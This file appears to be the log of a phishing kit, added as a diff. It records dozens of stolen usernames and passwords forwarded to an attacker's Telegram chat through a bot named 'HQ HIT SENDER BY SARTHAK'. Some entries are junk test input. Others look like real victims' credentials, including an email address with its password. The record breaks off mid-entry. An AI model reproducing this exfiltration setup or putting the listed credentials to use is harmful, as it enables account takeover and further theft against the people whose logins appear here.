@@ -1,0 +1,439 @@
+2026-05-01 17:52:02 - Attempting to send to chat_id: 1272510733
+Method: file_get_contents
+Response: 
+
+2026-05-01 17:53:24 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":6743,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777638204,"text":"jerrys \u2705\nUsername: daf\nPassword: dsv\nDate/Time (IST): 2026-05-01 05:53:24 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-01 17:56:23 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":6744,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777638383,"text":"jerrys \u2705\nUsername: \nPassword: \nDate/Time (IST): 2026-05-01 05:56:23 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-01 19:44:27 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":6746,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777644867,"text":"jerrys \u2705\nUsername: a\nPassword: a\nDate/Time (IST): 2026-05-01 07:44:27 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-01 20:23:48 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":6748,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777647228,"text":"jerrys \u2705\nUsername: singu\nPassword: a\nDate/Time (IST): 2026-05-01 08:23:48 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-01 20:34:22 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":6751,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777647862,"text":"jerrys \u2705\nUsername: bula\nPassword: khulla\nDate/Time (IST): 2026-05-01 08:34:22 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-04 22:59:33 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":7144,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777915774,"text":"jerrys \u2705\nUsername: Timegotcha\nPassword: Badwood23\nDate/Time (IST): 2026-05-04 10:59:33 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-04 23:04:26 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":7146,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1777916066,"text":"jerrys \u2705\nUsername: timegotcha\nPassword: Badwoofd23\nDate/Time (IST): 2026-05-04 11:04:26 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-05-26 20:32:05 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":7844,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1779807725,"text":"jerrys \u2705\nUsername: N\nPassword: B\nDate/Time (IST): 2026-05-26 08:32:05 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-02 12:38:34 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8091,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1780384114,"text":"jerrys \u2705\nUsername: gwuapmaker\nPassword: 45678\nDate/Time (IST): 2026-06-02 12:38:34 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-08 21:11:56 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8223,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1780933316,"text":"jerrys \u2705\nUsername: heroque\nPassword: 123123123\nDate/Time (IST): 2026-06-08 09:11:56 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-18 05:55:10 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8615,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1781742310,"text":"jerrys \u2705\nUsername: cthien94\nPassword: Anhyeuem123!\nDate/Time (IST): 2026-06-18 05:55:10 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-18 05:57:52 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8616,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1781742472,"text":"jerrys \u2705\nUsername: cthien94\nPassword: Anhyeuem123!\nDate/Time (IST): 2026-06-18 05:57:52 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-21 11:22:21 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8762,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782021141,"text":"jerrys \u2705\nUsername: Ge\nPassword: w\nDate/Time (IST): 2026-06-21 11:22:21 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:09:51 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8921,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394792,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:09:51 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:10:17 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8922,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394818,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:10:17 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:10:17 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8923,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394818,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:10:17 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:10:44 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8924,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394845,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:10:44 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:11:10 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8925,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394871,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:11:10 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:11:55 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8926,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394915,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:11:55 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:12:01 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8927,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394922,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:12:01 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:12:23 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8928,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394943,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:12:23 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-25 19:12:49 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":8929,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782394969,"text":"jerrys \u2705\nUsername: telegram@jagvir7\nPassword: will0buy0all0logs\nDate/Time (IST): 2026-06-25 07:12:49 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-29 11:38:04 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9089,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782713284,"text":"jerrys \u2705\nUsername: G\nPassword: t\nDate/Time (IST): 2026-06-29 11:38:04 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-06-30 16:45:47 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9130,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1782818148,"text":"jerrys \u2705\nUsername: Bonnycrypto254@gmail.com\nPassword: 2047Boni@\nDate/Time (IST): 2026-06-30 04:45:47 PM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":19,"length":24,"type":"email"}]}}
+Error: 
+
+2026-07-06 04:35:02 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9335,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1783292703,"text":"jerrys \u2705\nUsername: gfdsgdf\nPassword: dhgfgf\nDate/Time (IST): 2026-07-06 04:35:02 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-07-19 11:17:38 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9709,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1784440059,"text":"jerrys \u2705\nUsername: a\nPassword: a\nDate/Time (IST): 2026-07-19 11:17:38 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-07-19 12:01:34 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9713,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1784442694,"text":"jerrys \u2705\nUsername: ujnrger\nPassword: reg\nDate/Time (IST): 2026-07-19 12:01:34 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-07-19 12:04:09 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9714,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1784442850,"text":"jerrys \u2705\nUsername: jbhwd\nPassword: uje\nDate/Time (IST): 2026-07-19 12:04:09 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-07-19 16:11:54 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9720,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1784457714,"text":"jerrys \u2705\nUsername: Sarthak op\nPassword: op\nDate/Time (IST): 2026-07-19 04:11:54 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-07-24 02:33:34 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":9872,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1784840614,"text":"jerrys \u2705\nUsername:  k\nPassword: m\nDate/Time (IST): 2026-07-24 02:33:34 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-09 23:13:14 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10214,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1786297394,"text":"jerrys \u2705\nUsername: a\nPassword: a\nDate/Time (IST): 2026-08-09 11:13:14 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-18 10:15:42 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10350,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787028343,"text":"jerrys \u2705\nUsername: khshadow7\nPassword: Haris423424#\nDate/Time (IST): 2026-08-18 10:15:42 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:45:52 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10443,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588152,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:45:52 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:07 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10444,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588168,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:07 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:14 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10445,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588174,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:14 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:20 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10446,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588180,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:20 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:25 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10447,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588185,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:25 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:30 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10448,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588190,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:30 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:37 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10449,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588197,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:37 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:41 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10450,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588202,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:41 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:50 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10451,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588210,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:50 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:46:58 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10452,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588219,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:46:58 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:15 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10453,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588235,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:15 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:22 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10454,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588242,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:22 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:27 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10455,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588248,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:27 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:33 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10456,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588254,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:33 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:38 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10457,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588259,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:38 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:43 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10458,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588264,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:43 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:48 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10459,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588269,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:48 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:47:56 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10460,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588276,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:47:56 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-24 21:48:02 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10461,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787588282,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-24 09:48:02 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:24:51 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10510,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842492,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:24:51 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:01 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10511,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842501,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:01 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:06 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10512,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842507,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:06 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:12 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10513,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842513,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:12 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:19 - Attempting to send to chat_id: 1272510733
+Method: CURL
